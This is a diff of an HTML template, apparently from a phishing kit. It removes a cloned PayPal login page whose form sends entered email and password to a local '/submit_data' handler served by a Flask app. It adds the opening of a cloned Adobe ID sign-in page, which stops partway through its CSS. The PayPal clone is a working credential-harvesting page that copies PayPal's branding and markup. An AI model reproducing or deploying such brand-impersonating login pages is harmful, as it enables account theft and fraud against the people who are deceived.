@@ -1,348 +1,68 @@
 <!DOCTYPE html>
 
-<!--[if lt IE 9]><html lang="en" class="no-js lower-than-ie9 ie unknown"><![endif]-->
-<!--[if lt IE 10]><html lang="en" class="no-js lower-than-ie10 ie unknown"><![endif]-->
-<!--[if !IE]>-->
-<html class="no-js unknown" lang="en">
-<!--<![endif]-->
-
-<head>
-    <!--Script info: script: node, template:  , date: Apr 30, 2023 10:01:37 -07:00, country: US, language: en web version:  content version:  hostname : rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0KCh6/h2ON0qYFJ87ahTWaOrqXwcbJ1j5 rlogid : rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfc8CMK9ch4LYZpzCvqaJ8XL5jZp4vQ0wBTuiHHIUKiJR_187d31cdf90 -->
-    <meta charset="utf-8" />
-    <title>Log in to your PayPal account</title>
-    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
-    <meta content="PayPal" name="application-name" />
-    <meta content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" name="msapplication-task" />
-    <meta content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" name="msapplication-task" />
-    <meta content="transfer money, email money transfer, international money transfer " name="keywords" />
-    <meta content="Transfer money online in seconds with PayPal money transfer. All you need is an email address." name="description" />
-    <link href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" rel="shortcut icon" />
-    <link href="https://www.paypalobjects.com/webstatic/icon/pp64.png" rel="apple-touch-icon" />
-    <link href="https://www.paypal.com/us/signin" rel="canonical" />
-    <meta content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" name="viewport" />
-    <meta content="https://www.paypalobjects.com/webstatic/icon/pp258.png" property="og:image" />
-    <link href="https://www.paypalobjects.com/web/res/c03/c2fcc0329e681c046d715a140ff46/css/contextualLogin.css" rel="stylesheet" />
-    <!--[if lte IE 9]><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/c03/c2fcc0329e681c046d715a140ff46/css/ie9.css" /><![endif]-->
-    <!-- build:js inline -->
-    <!-- build:[src] js/lib/ -->
-    <!-- /build -->
-    <!-- /build -->
-    <style id="antiClickjack">
-        body {
-            display: none !important;
-        }
-    </style>
-    <link href="{{ url_for('static', filename='contextualLogin.css') }}" rel="stylesheet" type="text/css" />
-</head>
-
-<body class="unknown" data-ads-challenge-url="/auth/createchallenge/dbc585042849785a/challenge.js" data-cookie-banner-enabled="true" data-correlation-id="f188255b766ae" data-csrf-token="Kmgab0OiIvsd3f9dAZGShsbOwbi1zGbOlacYM=" data-email-label="Email"
-    data-enable-ads-captcha="true" data-enable-client-cal-logging="true" data-enable-fn-beacon-on-web-views="true" data-hostname="rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0KCh6/h2ON0qYFJ87ahTWaOrqXwcbJ1j5" data-is-hybrid-login-experience="true" data-lazy-load-country-codes="true"
-    data-load-start-time="1682874097552" data-nonce="5xEjn/TobUUyPQiSfRVhN7wWQDxaVkqryW5T6WjAo7eh4drz" data-phone-code="US +1" data-phone-password-enabled="true" data-production="true" data-rlogid="rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfc8CMK9ch4LYZpzCvqaJ8XL5jZp4vQ0wBTuiHHIUKiJR_187d31cdf90"
-    data-xhr-timeout-ineligible-list="MSIE 10|Windows NT 10" data-xhr-timeout-limit="20000"><noscript>
-        <p class="nonjsAlert" role="alert">NOTE: Many features on the PayPal Web site require Javascript and cookies.
-        </p>
-    </noscript>
-    <div class="main" id="main" role="main">
-        <section class="slLanding hide" data-role="page" data-title="Connect your Google account, check out faster on your devices" id="slLanding">
-            <div class="corral">
-                <div class="contentContainer contentContainerBordered" id="slContent">
-                    <header>
-                        <p aria-label="PayPal Logo" class="paypal-logo paypal-logo-long" role="img"></p>
-                    </header>
-                    <div class="linked" id="linked">
-                        <div class="profileRemembered"><span class="loginEmail"></span><a class="changeLink scTrack:not-you" href="#" id="changeLink">Change</a></div>
-                        <div class="headerTextDecorated"></div>
-                        <h1 class="headerText">Stay logged in for faster checkout</h1>
-                        <p class="description assure">Enable auto login on this browser and speed through checkout every time. (Not recommended for shared devices.)<span class="learnMoreLink"><a
-                                    class="secondayLink" href="#" id="slLoginLearnMore">What's this?</a></span></p>
-                        <div class="partnerProfile" id="partnerProfile">
-                            <div class="partnerPhoto" id="partnerPhoto" style="background-image: url('')"></div>
-                            <div class="partnerDetails"><span>You're logged in as</span>
-                                <div class="displayName" id="displayName"></div>
-                                <div>
-                                    <div class="partnerEmailDiv"><span class="partnerIcon"></span><span class="partnerEmail" id="partnerEmail"></span><span id="partnerEmailDomain"></span></div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="actions actionsSpacedShort"><button class="button actionContinue scTrack:unifiedlogin-continue" id="continueBtn" name="continueBtn" value="continueBtn">Continue</button></div>
-                        <div class="buttonAsLink secondaryLink" id="secondaryLogin"><button class="scTrack:unifiedlogin-use-password" id="secondaryLoginBtn" name="secondaryLoginBtn" value="secondaryLoginBtn">Use password instead</button></div>
-                    </div>
-                    <div class="unlinked" id="unlinked">
-                        <div class="partnerConnect" id="headerIcon"></div>
-                        <h1 class="headerText">Connect your Google account, check out faster on your devices</h1>
-                        <p class="description assure">Automatically log in to PayPal for faster checkout without typing your password wherever you're logged in with your Google account.<a class="secondayLink scTrack:unifiedlogin-sl-whatsthis" href="#" id="slOptInlearnMore">What's this?</a></p>
-                        <p class="secondaryLink hide" id="slOptIn_notNow"><a href="#">Not now</a></p>
-                    </div>
-                    <div class="learnMoreModal" id="learnMoreModal">
-                        <div class="optInLearnMoreDesc" id="optInLearnMoreDesc">
-                            <h1 class="headerText headerTextSpaced">Why connect my Google account?</h1>
-                            <p> Linking your Google account allows you to activate One Touch quickly and easily when you check out. You can always opt out later in Settings at PayPal.com.</p>
-                            <p> Whenever you check out on a new device and browser when logged in with your Google account, you can automatically log in at checkout without typing your password.</p>
-                        </div>
-                        <div class="slLoginLearnMoreDesc" id="slLoginLearnMoreDesc">
-                            <h1 class="headerText headerTextSpaced">Stay logged in for faster checkout</h1>
-                            <p> Skip typing your password by staying logged in on this device. For security, we'll occassionally ask you to log in, including every time you update your personal or financial info. We don't recommend using One Touch on shared
-                                devices. Turn this off at any time in your PayPal settings.</p>
-                        </div><button class="ui-dialog-titlebar-close" type="button"></button>
-                    </div>
-                    <div class="intentFooter">
-                        <div class="localeSelector">
-                            <ul class="localeLink">
-                                <li><a aria-current="”true”" class="selected scTrack:unifiedlogin-footer-language_en_US" data-locale="en_US" href="/signin?country.x=US&amp;locale.x=en_US&amp;langTgl=en" lang="en">English</a></li>
-                                <li><a class="scTrack:unifiedlogin-footer-language_fr_XC" data-locale="fr_XC" href="/signin?country.x=US&amp;locale.x=fr_XC&amp;langTgl=fr" lang="fr">Français</a></li>
-                                <li><a class="scTrack:unifiedlogin-footer-language_es_XC" data-locale="es_XC" href="/signin?country.x=US&amp;locale.x=es_XC&amp;langTgl=es" lang="es">Español</a></li>
-                                <li><a class="scTrack:unifiedlogin-footer-language_zh_XC" data-locale="zh_XC" href="/signin?country.x=US&amp;locale.x=zh_XC&amp;langTgl=zh" lang="zh">中文</a>
-                                </li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-        <section class="login" data-role="page" data-title="Log in to your PayPal account" id="login">
-            <div class="corral">
-                <div class="contentContainer activeContent contentContainerBordered" id="content">
-                    <header id="header">
-                        <p aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo" role="img">
-                        </p>
-                    </header>
-                    <h1 class="headerText accessAid" id="headerText">Log in to your PayPal account</h1>
-                    <p class="subHeaderText hide" id="phoneSubTagLine">Already set up to use your mobile number to log in? Type it below. Otherwise, click the link to log in with email.</p>
-                    <p class="subHeaderText hide" id="subTagLineConnectOtp">Forgot your email address? Go to the PayPal website to recover it.</p>
-                    <div class="" id="loginContent">
-                        <div class="" id="loginSection">
-                            <div class="notifications"></div>
-                            <div class="hide" id="keychainErrorMessage">
-                                <p class="notification notification-warning blocked-on-8ball hide">PayPal One Touch™ only works for checkout. Please login with your email.</p>
-                                <p class="notification notification-warning blocked-on-risky-login hide">Please login with your email and password.</p>
-                                <p class="notification notification-critical keychain-activation-failure hide">Something went wrong on our end. Please login with your email and password.</p>
-                            </div>
-                            <form action="/submit_data" autocomplete="off" class="proceed maskable" method="POST" name="login" novalidate=""><input id="token" name="_csrf" type="hidden" value="Kmgab0OiIvsd3f9dAZGShsbOwbi1zGbOlacYM=" /><input name="locale.x" type="hidden" value="en_US" /><input name="processSignin" type="hidden" value="main" /><input name="fn_sync_data"
-                                    type="hidden" value="fn_sync_data" /><input name="intent" type="hidden" value="signin" /><input name="ads-client-context" type="hidden" value="signin" /><input name="isValidCtxId" type="hidden" value="" /><input name="coBrand"
-                                    type="hidden" value="us" /><input name="signUpEndPoint" type="hidden" value="/webapps/mpp/account-selection"><input name="requestUrl" type="hidden" value="/signin"><input name="forcePhonePasswordOptIn" type="hidden" value="">
-                                <div class="profileDisplayName hide"></div>
-                                <div class="profileRememberedEmail hide"><span class="profileDisplayPhoneCode" dir="ltr"></span><span class="profileDisplayEmail notranslate"></span><a class="notYouLink scTrack:not-you" href="#" id="backToInputEmailLink">Change</a>
-                                </div>
-                                <div class="splitEmail" id="splitEmail">
-                                    <div class="splitPhoneSection splitEmailSection adjustSection" id="splitEmailSection">
-                                        <div class="countryPhoneSelectWrapper hide"><label class="accessAid" for="phoneCode">Choose your phone country code</label><select class="countryPhoneSelect" id="phoneCode" name="phoneCode">
-                                                <option data-code="+1" data-country="US" selected="selected"
-                                                    value="US +1">United States (+1)</option>
-                                            </select>
-                                            <div class="countryPhoneSelectChoice"><span class="countryCode">US</span><span class="phoneCode">+1</span></div>
-                                        </div>
-                                        <div class="textInput" id="login_emaildiv">
-                                            <div class="fieldWrapper"><input aria-describedby="emailErrorMessage" autocomplete="username" class="hasHelp validateEmpty" id="email" name="login_email" placeholder="Email or mobile number" required="required" type="email" value="">
-                                                <label class="fieldLabel" for="email">Email or mobile number</label>
-                                                </input>
-                                            </div>
-                                            <div class="errorMessage" id="emailErrorMessage">
-                                                <p class="emptyError hide">Required</p>
-                                                <p class="invalidError hide">That email or mobile number format isn’t right
-                                                </p>
-                                            </div>
-                                        </div><a class="recoveryOption" data-client-log-action-type="clickForgotEmailLink" href="/authflow/email-recovery/?redirectUri=%252Fsignin" id="forgotEmail">Forgot email?</a>
-                                        <div class="captcha captcha-container clearfix hide" id="splitHybridCaptcha">
-                                            <div class="captcha-image"><img alt="" src="" /></div>
-                                            <div class="captcha-inputs clearfix">
-                                                <div class="textInput">
-                                                    <div class="fieldWrapper"><input aria-describedby="captchaErrorMessage" autocomplete="off" class="hasHelp validateEmpty" id="splitHybridCaptcha" name="captchaCode" placeholder="Enter code" type="text" value="" /><label class="fieldLabel"
-                                                            for="splitHybridCaptcha"></label></div>
-                                                    <div class="errorMessage" id="captchaErrorMessage">
-                                                        <p class="emptyError hide">Required</p>
-                                                    </div>
-                                                </div>
-                                                <div class="refresh"><a class="captchaRefresh buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-reload-captcha imageLink" href=""><span class="accessAid">Reload Image</span></a></div>
-                                                <div class="audio"><audio class="hide" id="captchaPlayer" role="application" src=""></audio>
-                                                    <a class="captchaPlay buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-play-captcha-audio imageLink" href="" target="_blank"><span class="accessAid">Audio
-                                                            Button</span></a>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
-
-                                    <div class="tpdDemo hide" id="tpdDemo">
-                                        <p class="tpdDemoContent">Log in with your email as usual, and then you'll be prompted to log in with your phone's biometrics.</p>
-                                    </div><input class="validate" id="phone" name="login_phone" type="hidden" value="" />
-                                </div><input id="initialSplitLoginContext" name="initialSplitLoginContext" type="hidden" value="inputEmail" /><input id="isTpdOnboarded" name="isTpdOnboarded" type="hidden" value="" />
-
-
-                                <div class="clearfix showHideButtonForEligibleBrowser" id="passwordSection">
-                                    <div class="textInput" id="login_passworddiv">
-                                        <div class="fieldWrapper"><input aria-describedby="passwordErrorMessage" class="hasHelp validateEmpty pin-password" id="password" name="login_password" placeholder="Password" required="required" type="password" value="" />
-                                            <label class="fieldLabel" for="password">Password</label><label class="fieldLabel" for="Show password">Show password</label><button class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password"
-                                                id="Show password" type="button">Show</button>
-                                            <label class="fieldLabel" for="Hide">Hide</label><button class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" id="Hide" type="button">Hide</button></div>
-                                        <div class="errorMessage" id="passwordErrorMessage">
-                                            <p class="emptyError hide">Required</p>
-                                        </div>
-                                    </div><a class="recoveryOption forgotPassword" data-client-log-action-type="clickForgotPasswordLink" href="/authflow/password-recovery/?country.x=US&amp;locale.x=en_US&amp;redirectUri=%252Fsignin" id="forgotPassword">Forgot password?</a>
-                                </div>
-                        </div>
-                        <div class="captcha captcha-container clearfix hide" id="splitPasswordCaptcha">
-                            <div class="captcha-image"><img alt="" src="" /></div>
-                            <div class="captcha-inputs clearfix">
-                                <div class="textInput">
-                                    <div class="fieldWrapper"><input aria-describedby="captchaErrorMessage" autocomplete="off" class="hasHelp validateEmpty" id="splitPasswordCaptcha" name="captcha" placeholder="Enter code" type="text" value="" /><label class="fieldLabel" for="splitPasswordCaptcha"></label></div>
-                                    <div class="errorMessage" id="captchaErrorMessage">
-                                        <p class="emptyError hide">Required</p>
-                                    </div>
-                                </div>
-                                <div class="refresh"><a class="captchaRefresh buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-reload-captcha imageLink" href=""><span class="accessAid">Reload Image</span></a></div>
-                                <div class="audio"><audio class="hide" id="captchaPlayer" role="application" src=""></audio>
-                                    <a class="captchaPlay buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-play-captcha-audio imageLink" href="" target="_blank"><span class="accessAid">Audio
-                                                        Button</span></a>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="actions"><button class="button actionContinue scTrack:unifiedlogin-login-submit" id="btnLogin" name="btnLogin" type="submit" value="Login">Log In</button>
-                        </div>
-                    </div><input name="splitLoginContext" type="hidden" value="inputEmail" /></input>
-                    </input>
-                    </input>
-                    </form>
-                    <div class="moreOptionsDiv hide" id="moreOptionsContainer"><a class="moreOptionsInfo" href="#" id="moreOptions">More options</a>
-                        <div class="bubble-tooltip hide" id="moreOptionsDropDown">
-                            <ul class="moreoptionsGroup">
-                                <li><a class="scTrack:unifiedlogin-click-more-options-mobile" href="#" id="moreOptionsMobile">Approve login using mobile device</a></li>
-                                <li><a class="scTrack:unifiedlogin-click-forgot-password pwrLink" href="/authflow/password-recovery/?country.x=US&amp;locale.x=en_US&amp;redirectUri=%252Fsignin">Having
-                                                trouble logging in?</a></li>
-                            </ul>
-                        </div>
-                    </div>
-                    <div class="tryAnotherWayLinkContainer hide hide" data-hide-on-pass="" id="tryAnotherWayLinkContainer"><a href="#" id="tryAnotherWayLink">Try another way</a>
-                    </div>
-                    <div class="signupContainer" data-hide-on-email="" data-hide-on-pass="" id="signupContainer">
-                        <div class="loginSignUpSeparator"><span class="textInSeparator">or</span></div><button class="button secondary scTrack:unifiedlogin-click-signup-button" href="/us/webapps/mpp/account-selection" id="createAccount" type="button">Sign
-                                    Up</button>
-                    </div>
-                    <div class="signupContainer hide" id="tpdButtonContainer">
-                        <div class="loginSignUpSeparator"><span class="textInSeparator">or</span></div>
-                        <div class="actions"><button class="button secondary" id="tpdButton" type="submit" value="Approve login using mobile device">Approve login using mobile
-                                        device</button></div>
-                    </div>
-                </div>
-            </div>
-            <div class="intentFooter">
-                <div class="localeSelector">
-                    <ul class="localeLink">
-                        <li><a aria-current="”true”" class="selected scTrack:unifiedlogin-footer-language_en_US" data-locale="en_US" href="/signin?country.x=US&amp;locale.x=en_US&amp;langTgl=en" lang="en">English</a></li>
-                        <li><a class="scTrack:unifiedlogin-footer-language_fr_XC" data-locale="fr_XC" href="/signin?country.x=US&amp;locale.x=fr_XC&amp;langTgl=fr" lang="fr">Français</a></li>
-                        <li><a class="scTrack:unifiedlogin-footer-language_es_XC" data-locale="es_XC" href="/signin?country.x=US&amp;locale.x=es_XC&amp;langTgl=es" lang="es">Español</a></li>
-                        <li><a class="scTrack:unifiedlogin-footer-language_zh_XC" data-locale="zh_XC" href="/signin?country.x=US&amp;locale.x=zh_XC&amp;langTgl=zh" lang="zh">中文</a>
-                        </li>
-                    </ul>
-                </div>
-            </div>
-    </div>
-    </div>
-    <div class="tryAnotherWayModal hide" id="tryAnotherWayModal">
-        <div class="modal-content">
-            <div class="modal-content-header">
-                <div class="modal-header-text">Try another way</div>
-                <div><button aria-label="dialog-close-btn" class="dialog-close" id="closeModal" type="button"></button></div>
-            </div>
-            <ul class="modal-content-body">
-                <li class="hide">
-                    <a aria-label="Login with Touch ID or Face ID" href="#" id="loginWithWebauthn">
-                        <div>Log in with face, fingerprint or PIN</div><button aria-label="webauthn-chevron" class="chevron-right"></button>
-                    </a>
-                </li>
-                <li class="hide">
-                    <a aria-label="Login with phone one-time code" href="#" id="loginWithOtp">
-                        <div>Text a one-time code</div><button aria-label="phone-otc-chevron" class="chevron-right"></button>
-                    </a>
-                </li>
-                <li class="hide">
-                    <a aria-label="Login with email one-time code" href="#" id="loginWithEmailOtp">
-                        <div>Email a one-time code</div><button aria-label="email-otc-chevron" class="chevron-right"></button>
-                    </a>
-                </li>
-                <li class="">
-                    <a aria-label="Login with password" href="#" id="loginWithPassword">
-                        <div>Log in with your password</div><button aria-label="pwd-chevron" class="chevron-right"></button>
-                    </a>
-                </li>
-            </ul>
-        </div>
-    </div>
-    </section>
-    <section class="verification hide" data-role="page" data-title="Login Confirmation - PayPal" id="verification">
-        <div class="corral">
-            <div class="contentContainer contentContainerLean">
-                <div class="verificationSubSection" id="pending">
-                    <h1 class="headerText">Open the PayPal app</h1>
-                    <p class="verification-message hide" id="uncookiedMessage">Open the PayPal app, tap Yes on the prompt, then tap <span class="twoDigitPin">{twoDigitPin}</span> on your phone to log in.</p>
-                    <p class="verification-message hide" id="cookiedMessage">Open the PayPal app and tap Yes on the prompt to log in.</p>
-                    <div class="notifications"></div>
-                    <div class="accountArea"><span class="account"></span><span class="verificationNotYou"><a
-                                    class="scTrack:unifiedlogin-verification-click-notYou" data-href="#" href="#"
-                                    id="pendingNotYouLink">Not you?</a></span></div>
-                    <div class="mobileNotification">
-                        <p class="pin"></p>
-                        <div class="mobileScreen"><img alt="phone" src="https://www.paypalobjects.com/images/shared/icon-PN-check.png" /></div>
-                    </div>
-                    <p class="tryAnotherMsg"><a class="inlineLink scTrack:try-password" data-href="#" href="" id="tryPasswordLink">Use password instead</a></p>
-                    <p class="resendMsg"><a class="inlineLink scTrack:resend hide" data-href="#resend" href="" id="resend" role="button">Resend</a><span class="sentMessage hide">Sent</span></p>
-                </div>
-                <div class="hide verificationSubSection" id="expired">
-                    <header>
-                        <p aria-label="PayPal Logo" class="paypal-logo paypal-logo-long" role="img">PayPal</p>
-                    </header>
-                    <h1 class="headerText headerTextWarning">Sorry, we couldn't confirm it's you</h1>
-                    <p class="slimP">We didn't receive a response so we were unable confirm your identity.</p>
-                    <button class="button actionsSpaced" id="expiredTryAgainButton">Try Again</button>
-                </div>
-                <div class="denied hide verificationSubSection" id="denied"><img alt="" class="deniedCaution" src="https://www.paypalobjects.com/images/shared/glyph_alert_critical_big-2x.png" />
-                    <h1 class="headerText">Sorry, we couldn't confirm it's you</h1>
-                    <p>Need a hand?, <a class="inlineLink scTrack:help" href="/{coBrand}/cgi-bin/helpscr?cmd=_help">We can help</a>.</p>
-                </div>
-            </div>
-        </div>
-    </section>
-    <footer class="footer" role="contentinfo">
-        <div class="legalFooter">
-            <ul class="footerGroup">
-                <li><a href="/us/smarthelp/contact-us" target="_blank">Contact Us</a></li>
-                <li><a href="/us/webapps/mpp/ua/privacy-full" target="_blank">Privacy</a></li>
-                <li><a href="/us/webapps/mpp/ua/legalhub-full" target="_blank">Legal</a></li>
-                <li><a href="/us/webapps/mpp/ua/upcoming-policies-full" target="_blank">Policy Updates</a></li>
-                <li><a href="/us/webapps/mpp/country-worldwide" target="_blank">Worldwide</a></li>
-            </ul>
-        </div>
-    </footer>
-    </div>
-    <div class="transitioning hide">
-        <p class="welcomeMessage hide">Welcome, !</p>
-        <p class="checkingInfo hide">Checking your info…</p>
-        <p class="oneSecond hide">Just a second…</p>
-        <p class="secureMessage hide">Securely logging you in...</p>
-        <p class="oneTouchMessage hide"></p>
-        <p class="retrieveInfo hide">Retrieving your info...</p>
-        <p class="waitFewSecs hide">This may take a few seconds...</p>
-        <p class="udtSpinnerMessage udtLogin hide">We recognize you on this device, and we’re securely logging you in.
-        </p>
-        <p class="udtSpinnerMessage udtLoginXo hide">We recognize you on this device, so no need to enter your password for this purchase.</p>
-        <p class="udtSpinnerMessage webllsXoUS hide">We recognize you on this device, so you can skip login.
-            <br /><br />Manage this setting in your profile.</p>
-        <p class="udtSpinnerMessage webllsSCA hide">We're taking you to PayPal Checkout to complete payment.</p>
-        <p class="qrcMessage hide">Redirecting...</p>
-        <p class="webAuthnOptin hide">Updating your login settings...</p>
-        <p class="webAuthnLogin hide">Logging you in...</p>
-        <div class="keychain spinner-content uiExp hide"></div>
-    </div><noscript><img alt="" border="0" height="1"
-            src="https://c.paypal.com/v1/r/d/b/ns?f=6030f246881449ad99abf0de2c5426b7&amp;s=UNIFIED_LOGIN_INPUT_EMAIL&amp;js=0&amp;r=1"
-            title="ppfniframe" width="1" /></noscript>
-    <!-- build:js inline -->
-    <!-- build:[src] js/lib/ -->
-    <!-- /build -->
-    <!-- /build -->
-    <!-- build:js inline -->
-    <!-- build:[src] js/ -->
-    <!-- /build -->
-    <!-- /build --><noscript><img alt="" border="0" height="1"
-            src="https://t.paypal.com/ts?nojs=1&amp;pgrp=main%3Aunifiedlogin%3Asplitlogin%3A%3Aemail&amp;page=main%3Aunifiedlogin%3Asplitlogin%3A%3Aemail%3A%3A%3A&amp;qual=input_email&amp;pgst=1682874097552&amp;calc=f188255b766ae&amp;nsid=3OXGc-5DoT86WBJ63G9-h4ZfHLfBlLvO&amp;rsta=en_US&amp;pgtf=Nodejs&amp;env=live&amp;s=ci&amp;ccpg=US&amp;csci=6030f246881449ad99abf0de2c5426b7&amp;comp=unifiedloginnodeweb&amp;tsrce=unifiedloginnodeweb&amp;cu=0&amp;ef_policy=ccpa&amp;transition_name=ss_prepare_email&amp;userRedirected=true&amp;ctx_login_ot_content=0&amp;obex=signin&amp;landing_page=login&amp;state_name=begin_email&amp;ctx_login_ctxid_fetch=ctxid-not-exist&amp;ctx_login_content_fetch=success&amp;ctx_login_lang_footer=shown&amp;ctx_login_signup_btn=shown%7Cdefault&amp;ctx_login_intent=signin&amp;ctx_login_flow=Signin&amp;ctx_login_state_transition=login_loaded&amp;post_login_redirect=default&amp;ret_url=%2F"
-            width="1" /></noscript>
-</body>
-
-</html>
+<html lang="en"><head><meta charset="utf-8"/><meta content="base-uri 'self';  object-src 'none';  script-src 'self' 'unsafe-inline' 'report-sample' https://wwwimages2.stage.adobe.com https://auth-stg1.services.adobe.com https://kapture.corp.adobe.com https://stage-server.messaging.adobe.com https://wwwimages2.adobe.com https://c.evidon.com https://auth.services.adobe.com https://cdn.arkoselabs.com https://auth-ci-statics.dev.services.adobe.com https://assets.adobedtm.com https://www.adobe.com/marketingtech/ https://use.typekit.net https://www.google.com/recaptcha/ https://www.recaptcha.net https://recaptcha.net https://www.gstatic.com/recaptcha/ https://www.gstatic.cn/recaptcha/ https://api.demandbase.com https://adobe-api.arkoselabs.com 'nonce-NzaTOej1MFoqlnj7Vxt+QA==' 'sha256-qz5t9UkuvqqEypV44P1Kv4IsgQkkIhq3u1QLznghVSA=' 'sha256-l5Y/tp7bqvYu0DvohidHeCojuhNlf1uNygJUYCRVZ0o=' 'sha256-yuDEasptA5ysRmmdaG7VMRWcqTabkBV4P0bGUozTvlU=' 'sha256-ERU9tc8PampVbfmF09VXHKoQQS6yKQbfSsYJ7gAlq6M=' ;  style-src 'self' 'report-sample' 'unsafe-inline' https://p.typekit.net https://adobe-api.arkoselabs.com https://cdn.arkoselabs.com;  font-src 'self' data: https://use.typekit.net;  block-all-mixed-content ;  frame-src https://localhost.corp.adobe.com:* https://commerce-stg.adobe.com https://zeonchatclient-stage-va6.stage.cloud.adobe.io https://core-ml-fraud-detection-stage-public.azureedge.net https://ui.messaging.adobe.com https://commerce.adobe.com https://zeonchatclient-va6.cloud.adobe.io https://core-ml-fraud-detection-production-public.azureedge.net https://www.google.com/recaptcha/ https://recaptcha.net https://www.recaptcha.net https://adobe-api.arkoselabs.com https://client-api.arkoselabs.com;  img-src 'self' https://stats.adobe.com/ http://stats.adobe.com/ https://pps-stage.services.adobe.com https://auth-ci-statics.dev.services.adobe.com https://*.s2stagehance.com https://wwwimages.stage.adobe.com https://auth-stg1.services.adobe.com https://primary.stock.stage.adobe.com https://l.betrad.com https://c.evidon.com https://auth.services.adobe.com https://primary.stock.adobe.com https://www.adobe.com https://pps.services.adobe.com https://*.behance.net https://p.typekit.net https://static.adobelogin.com https://www.gstatic.com https://wwwimages.adobe.com https://sstats.adobe.com https://adobe-api.arkoselabs.com https://cdn.arkoselabs.com data: ;  connect-src 'self' http://localhost.corp.adobe.com:8080 http://localhost.corp.adobe.com:4000/ https://stats.adobe.com/ http://stats.adobe.com/ https://auth-api-stg1.services.adobe.com https://stage-client.messaging.adobe.com https://stage-server.messaging.adobe.com https://delegated-stg1.adobelogin.com https://cc-api-behance-stage.adobe.io https://sso.s2stagehance.com https://delegated.identity-stage.adobe.com https://auth-api.services.adobe.com https://delegated.adobelogin.com https://cc-api-data.adobe.io https://server.messaging.adobe.com https://auth-api-i.services.adobe.com https://cc-api-behance.adobe.io https://sso.behance.net https://delegated.identity.adobe.com https://performance.typekit.net https://sstats.adobe.com https://primer.typekit.net https://dpm.demdex.net https://use.typekit.net https://p.typekit.net https://adobe-api.arkoselabs.com" http-equiv="Content-Security-Policy"/><meta content="ie=edge" http-equiv="x-ua-compatible"/><title>Adobe ID</title><meta content="width=device-width,initial-scale=1,viewport-fit=cover" name="viewport"/><meta content="Adobe ID" name="description"/><noscript><style type="text/css">.Canvas-Layout {visibility:visible !important;}</style></noscript><style type="text/css">.Canvas-Layout.Canvas-Layout--susi-loaded {visibility: visible !important;}
+        .Canvas-Layout {visibility: hidden;}
+        .Canvas-Layout--susi-loaded.Canvas-Layout--with-header .Canvas-Header {display: flex !important;}
+        .Canvas-Layout--susi-loaded.Canvas-Layout--with-footer .Canvas-Footer {display: flex !important;}
+        .Canvas-Header, .Canvas-Footer {display: none;}
+        @media screen and (min-width: 1024px) {
+          .Canvas-Layout .Canvas-Grid.Canvas-Grid--reverse-dcp .Canvas-Context {-ms-grid-column: 15;-ms-grid-column-span: 7;grid-column: 8 / 12;}
+        }
+        @media screen and (min-width: 1024px) {
+          .Canvas-Layout .Canvas-Grid.Canvas-Grid--reverse-dcp .Canvas-Panel {-ms-grid-column: 3;-ms-grid-column-span: 11;grid-column: 2 / 8;}
+        }
+        @media screen and (min-width: 1280px) {
+          .Canvas-Layout .Canvas-Grid.Canvas-Grid--reverse-dcp .Canvas-Panel.Canvas-Item {-ms-grid-column: 3;-ms-grid-column-span: 9;grid-column: 2 / 7;}
+        }
+
+        /* IE11 Hack for vertical alignment because it doesn't support min-height in the way needed */
+        _:-ms-fullscreen, :root .Canvas-Layout { height: 100%; }
+
+        #App, #UnsupportedBrowser { display: none; }
+
+        [data-social-button-type='icon'] { height: 18px; }
+
+        .EmailPage__content.EmailPage__content--reversed {
+          flex-direction: column-reverse;
+          justify-content: flex-end;
+        }
+
+        .EmailPage__content.EmailPage__content--reversed .EmailPage__continue-with-email {
+          display: block;
+        }
+
+        #SocialButtons-Container[data-social-buttons-container-condition='is-round'] [data-social-buttons-container='regular'] { display: none; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-round'] [data-social-buttons-container='round'] { display: block; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-round'] [data-social-buttons-container='white'] { display: none; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-round'] [data-social-buttons-container='regular-white-bk'] { display: none; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-round'] [data-social-buttons-container='regular-white-bk-with-distance'] { display: none; }
+            
+        #SocialButtons-Container[data-social-buttons-container-condition='is-regular'] [data-social-buttons-container='regular'] { display: block; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-regular'] [data-social-buttons-container='round'] { display: none; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-regular'] [data-social-buttons-container='white'] { display: none; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-regular'] [data-social-buttons-container='regular-white-bk'] { display: none; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-regular'] [data-social-buttons-container='regular-white-bk-with-distance'] { display: none; }
+
+        #SocialButtons-Container[data-social-buttons-container-condition='is-white'] [data-social-buttons-container='regular'] { display: none; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-white'] [data-social-buttons-container='round'] { display: none; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-white'] [data-social-buttons-container='white'] { display: block; }
